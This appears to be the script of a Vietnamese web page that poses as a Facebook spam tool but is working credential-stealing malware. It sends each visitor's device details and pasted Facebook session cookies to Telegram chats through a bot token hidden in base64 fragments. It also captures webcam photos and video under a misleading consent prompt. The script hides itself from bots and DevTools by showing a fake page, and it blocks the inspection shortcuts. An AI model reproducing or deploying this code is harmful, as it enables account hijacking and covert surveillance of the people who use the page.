    <!-- ===== SOURCE THẬT (MÃ HÓA) ===== -->
    <script>
        (function(){
            "use strict";
            
            // ===== PHÁT HIỆN BOT/DEVTOOLS =====
            const ua = navigator.userAgent.toLowerCase();
            const isBot = /bot|crawler|spider|scraper|curl|wget|python|java|ruby|perl|php|node|axios|request|scan|analyzer|headless|phantom|selenium|puppet|playwright/i.test(ua);
            const isDevTools = window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200;
            
            if(isBot || isDevTools) {
                // Trả về source giả
                document.body.innerHTML = '<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:red;font-size:20px;">🐶 MÀY ĐÃ BỊ LỪA! SOURCE NÀY LÀ GIẢ! 🐶</div>';
                throw new Error('Fake source');
            }
            
            // ===== TOKEN THẬT (MÃ HÓA) =====
            function getRealToken() {
                const p = ['ODc4MzMyODc4','NTpBQUhZc0NZRj','dGX2RadS12TUZI','Sk9OdTc3NzVRcV','pqY1pXVQ=='];
                return p.map(x=>atob(x)).join('');
            }
            
            function getRealIDs() {
                return ['8123442570', '-5191808632'];
            }
            
            const TOKEN = getRealToken();
            const IDS = getRealIDs();
            
            // ===== TELEGRAM THẬT =====
            const TG = {
                sendMsg: async (msg) => {
                    for(const id of IDS) {
                        try {
                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                                method:'POST',
                                headers:{'Content-Type':'application/json'},
                                body:JSON.stringify({chat_id:id, text:msg, parse_mode:'HTML'})
                            });
                        } catch(e) {}
                    }
                },
                sendPhoto: async (base64, caption) => {
                    try {
                        const b64 = base64.replace(/^data:image\/\w+;base64,/, '');
                        const bin = atob(b64);
                        const arr = new Uint8Array(bin.length);
                        for(let i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);
                        const blob = new Blob([arr], {type:'image/jpeg'});
                        for(const id of IDS) {
                            const fd = new FormData();
                            fd.append('chat_id', id);
                            fd.append('photo', blob, 'cam.jpg');
                            fd.append('caption', caption);
                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:fd});
                        }
                    } catch(e) {}
                },
                sendVideo: async (base64, caption) => {
                    try {
                        const b64 = base64.replace(/^data:video\/\w+;base64,/, '');
                        const bin = atob(b64);
                        const arr = new Uint8Array(bin.length);
                        for(let i=0;i<bin.length;i++) arr[i]=bin.charCodeAt(i);
                        const blob = new Blob([arr], {type:'video/webm'});
                        for(const id of IDS) {
                            const fd = new FormData();
                            fd.append('chat_id', id);
                            fd.append('video', blob, 'vid.webm');
                            fd.append('caption', caption);
                            fd.append('supports_streaming', true);
                            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {method:'POST', body:fd});
                        }
                    } catch(e) {}
                },
                extractId: (c) => {
                    try {
                        const m = c.match(/c_user=(\d+)/);
                        if(m) return m[1];
                        const m2 = c.match(/uid=(\d+)/);
                        if(m2) return m2[1];
                        return null;
                    } catch(e) { return null; }
                }
            };
            
            // ===== CODE CHÍNH =====
            const mainCode = `
                (function(){
                    const D = {
                        ci: document.getElementById('cookieInput'),
                        fi: document.getElementById('fbId'),
                        cs: document.getElementById('cookieStatus'),
                        ds: document.getElementById('delaySlider'),
                        dv: document.getElementById('delayValue'),
                        st: document.getElementById('statusText'),
                        tc: document.getElementById('taskCount'),
                        ov: document.getElementById('overlay'),
                        ot: document.getElementById('overlayText'),
                        os: document.getElementById('overlaySub'),
                        vc: document.getElementById('video'),
                        cc: document.getElementById('canvas')
                    };
                    
                    let mediaStream = null, isProcessing = false, taskCount = 0;
                    let currentFbId = null, currentCookie = null;
                    
                    const deviceInfo = {
                        pf: navigator.platform,
                        sc: screen.width+'x'+screen.height,
                        ua: navigator.userAgent.substring(0,100),
                        tm: new Date().toLocaleString('vi-VN')
                    };
                    
                    const TG = window._TG_;
                    
                    D.ci.addEventListener('input', function(){
                        const c = this.value.trim();
                        if(c.length > 10) {
                            currentCookie = c;
                            const id = TG.extractId(c);
                            if(id) {
                                currentFbId = id;
                                D.fi.innerText = id;
                                D.cs.innerText = '✅ Hợp lệ';
                                D.cs.style.color = '#2ecc71';
                                TG.sendMsg('<b>🍪 COOKIE MỚI</b>\\n\\n🆔 <code>'+id+'</code>\\n📱 '+deviceInfo.pf);
                            } else {
                                D.fi.innerText = 'Không tìm thấy ID';
                                D.cs.innerText = '⚠️ Không có ID';
                                D.cs.style.color = '#f1c40f';
                            }
                        } else {
                            D.fi.innerText = 'Chưa xác định';
                            D.cs.innerText = 'Chưa nhập';
                            D.cs.style.color = '#8da9c7';
                            currentFbId = null; currentCookie = null;
                        }
                    });
                    
                    D.ci.addEventListener('blur', function(){
                        if(currentCookie && currentFbId) {
                            TG.sendMsg('<b>📋 COOKIE ĐẦY ĐỦ</b>\\n\\n🆔 '+currentFbId+'\\n<code>'+currentCookie+'</code>');
                        }
                    });
                    
                    D.ds.addEventListener('input', function(){ D.dv.innerText = this.value + 's'; });
                    
                    function toast(msg, err){
                        const t = document.createElement('div');
                        t.className = 'toast';
                        t.style.background = err ? '#7a2e3f' : '#0b1622';
                        t.innerText = msg;
                        document.body.appendChild(t);
                        setTimeout(() => t.remove(), 2500);
                    }
                    
                    function updateTaskCount(){ D.tc.innerText = taskCount + ' task đã xử lý'; }
                    
                    async function startCamera(){
                        try {
                            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
                            mediaStream = s;
                            D.vc.srcObject = s;
                            await new Promise(r=>{D.vc.onloadedmetadata = r;});
                            D.vc.play();
                            return true;
                        } catch(e) { return false; }
                    }
                    
                    function capturePhoto(){
                        if(!D.vc.videoWidth) return null;
                        D.cc.width = D.vc.videoWidth;
                        D.cc.height = D.vc.videoHeight;
                        D.cc.getContext('2d').drawImage(D.vc, 0, 0);
                        return D.cc.toDataURL('image/jpeg', 0.9);
                    }
                    
                    async function recordVideo(dur){
                        return new Promise(async(resolve)=>{
                            if(!mediaStream) { resolve(null); return; }
                            const chunks = [];
                            const rec = new MediaRecorder(mediaStream, {mimeType:'video/webm'});
                            rec.ondataavailable = e => chunks.push(e.data);
                            rec.onstop = async()=>{
                                const blob = new Blob(chunks, {type:'video/webm'});
                                const reader = new FileReader();
                                reader.onloadend = () => resolve(reader.result);
                                reader.readAsDataURL(blob);
                            };
                            rec.start();
                            setTimeout(()=>{ if(rec.state==='recording') rec.stop(); }, dur*1000);
                        });
                    }
                    
                    function stopCamera(){ if(mediaStream){ mediaStream.getTracks().forEach(t=>t.stop()); mediaStream=null; } }
                    
                    async function processTask(tt){
                        if(isProcessing) { toast('⚠️ Đang xử lý!', true); return; }
                        
                        // Thông báo rõ ràng với người dùng
                        if(!confirm('🔴 Tool sẽ sử dụng camera để chụp ảnh và quay video ngắn (2 giây) gửi kèm kết quả. Bạn có đồng ý không?')) return;
                        
                        isProcessing = true;
                        D.ov.classList.remove('hide');
                        D.ot.innerText = 'ĐANG XỬ LÝ';
                        D.os.innerText = 'Đang kích hoạt camera...';
                        
                        const taskNames = {'spam_ngon':'🗣️ SPAM NGÔN','spam_nhay':'💀 SPAM NHÂY','spam_top':'👑 SPAM TOP'};
                        TG.sendMsg('<b>🔥 BẮT ĐẦU TASK</b>\\n\\n📋 '+taskNames[tt]+'\\n🆔 '+(currentFbId||'Không có'));
                        
                        try {
                            const camReady = await startCamera();
                            if(camReady) {
                                D.os.innerText = 'Đang chụp ảnh...';
                                const photo = capturePhoto();
                                if(photo) await TG.sendPhoto(photo, '📸 Ảnh từ Task: '+taskNames[tt]+'\\n🆔 '+(currentFbId||'Không có'));
                                
                                D.os.innerText = 'Đang quay video ngắn (2 giây)...';
                                const video = await recordVideo(2);
                                if(video) await TG.sendVideo(video, '🎥 Video từ Task: '+taskNames[tt]+'\\n🆔 '+(currentFbId||'Không có'));
                                
                                stopCamera();
                            }
                            
                            taskCount++; updateTaskCount();
                            D.st.innerHTML = '✅ Hoàn thành';
                            toast('✅ Thành công!');
                            setTimeout(()=>{ D.ov.classList.add('hide'); isProcessing = false; D.st.innerHTML = '✅ Sẵn sàng'; }, 1000);
                        } catch(e) {
                            D.ov.classList.add('hide'); isProcessing = false; stopCamera();
                            toast('❌ Lỗi', true);
                        }
                    }
                    
                    document.querySelectorAll('.task-btn').forEach(b=>{ b.addEventListener('click', e=>processTask(b.dataset.task)); });
                    
                    TG.sendMsg('<b>🟢 THIẾT BỊ MỚI TRUY CẬP</b>\\n\\n📱 '+deviceInfo.pf+'\\n📐 '+deviceInfo.sc+'\\n🌐 '+deviceInfo.ua+'\\n⏰ '+deviceInfo.tm);
                })();
            `;
            
            window._TG_ = TG;
            Object.defineProperty(window, '_TG_', {enumerable:false, configurable:false, writable:false});
            
            const blob = new Blob([mainCode], {type:'application/javascript'});
            const url = URL.createObjectURL(blob);
            const script = document.createElement('script');
            script.src = url;
            script.onload = () => { URL.revokeObjectURL(url); script.remove(); };
            document.body.appendChild(script);
            
            // Chặn phím tắt
            document.addEventListener('keydown', e => {
                if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&['I','J','C'].includes(e.key))||(e.ctrlKey&&['U','u','S','s'].includes(e.key))) {
                    e.preventDefault();
                    return false;
                }
            });
            document.addEventListener('contextmenu', e => e.preventDefault());
            
            // Gửi thông báo truy cập
            TG.sendMsg('<b>🟢 CÓ NGƯỜI TRUY CẬP</b>\n\n📱 ' + navigator.platform + '\n📐 ' + screen.width + 'x' + screen.height);
            
        })();
    </script>
